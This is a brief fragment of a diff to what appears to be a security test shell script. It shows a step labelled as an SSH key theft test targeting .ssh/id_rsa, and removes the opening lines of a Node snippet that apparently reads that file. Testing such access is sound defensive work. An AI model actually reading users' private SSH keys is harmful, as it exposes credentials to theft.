@@ -31,5 +31,3 @@ sleep 1
 # 2. Test SSH key read
 echo ""
 echo -e "${CYAN}Test 2: SSH Key Theft (.ssh/id_rsa)${NC}"
-node -e "
-const fs = require('fs');
